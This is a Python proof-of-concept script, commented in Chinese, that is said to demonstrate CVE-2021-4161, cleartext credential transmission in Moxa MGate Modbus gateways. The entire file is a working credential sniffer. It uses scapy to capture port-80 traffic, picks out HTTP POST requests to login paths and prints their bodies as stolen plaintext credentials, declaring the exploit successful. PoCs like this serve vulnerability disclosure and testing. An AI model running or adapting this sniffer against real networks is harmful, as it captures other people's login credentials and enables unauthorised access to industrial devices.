#!/usr/bin/env python3
"""
CVE-2021-4161 POC脚本
用于演示Moxa MGate Modbus网关的明文凭据传输漏洞

该POC使用scapy库嗅探网络流量，捕获通过HTTP POST传输的登录凭据

使用方法：
1. 确保已安装scapy: pip3 install scapy
2. 运行该脚本: python3 cve_2021_4161_poc.py
3. 在浏览器中访问http://localhost并尝试登录
4. 观察脚本输出，查看捕获的明文凭据
"""

from scapy.all import sniff, TCP, IP, Raw
import re

# 捕获到HTTP POST请求时的处理函数
def packet_handler(packet):
    """处理捕获到的网络数据包"""
    try:
        # 检查是否为TCP数据包，目标端口为80（HTTP），并且包含原始数据
        if (packet.haslayer(TCP) and 
            packet[TCP].dport == 80 and 
            packet.haslayer(Raw)):
            
            # 提取原始数据
            raw_data = packet[Raw].load
            
            # 检查是否为HTTP POST请求
            if b'POST' in raw_data[:10]:
                # 尝试解码为UTF-8
                try:
                    http_data = raw_data.decode('utf-8')
                    
                    # 提取请求路径
                    path_match = re.search(r'POST (.*?) HTTP/1\.1', http_data)
                    if path_match:
                        path = path_match.group(1)
                        
                        # 检查是否为登录请求
                        if '/login' in path:
                            print(f"\n[+] 发现登录请求: {path}")
                            
                            # 提取请求体（登录凭据）
                            if '\r\n\r\n' in http_data:
                                headers, body = http_data.split('\r\n\r\n', 1)
                                if body:
                                    print(f"[!] 明文传输的登录凭据: {body}")
                                    print("\n[+] 漏洞利用成功！")
                                    print("\n" + "="*50)
                                    
                except UnicodeDecodeError:
                    # 忽略无法解码的数据包
                    pass
    
    except Exception as e:
        print(f"[-] 处理数据包时出错: {e}")

def start_sniffing():
    """开始嗅探网络流量"""
    print("="*70)
    print("CVE-2021-4161 POC - Moxa MGate Modbus网关明文凭据漏洞")
    print("="*70)
    print("\n[+] 开始嗅探网络流量，等待登录请求...")
    print("[+] 请在浏览器中访问 http://localhost 并尝试登录")
    print("[+] 按 Ctrl+C 停止嗅探")
    print("\n" + "="*70)
    
    try:
        # 嗅探所有TCP流量，过滤端口80
        sniff(filter="tcp port 80", prn=packet_handler, store=False)
    except KeyboardInterrupt:
        print("\n[+] 停止嗅探")
    except Exception as e:
        print(f"[-] 嗅探过程中出错: {e}")

if __name__ == "__main__":
    # 检查scapy是否安装
    try:
        from scapy.all import sniff
    except ImportError:
        print("[-] 请先安装scapy库: pip3 install scapy")
        exit(1)
    
    start_sniffing()
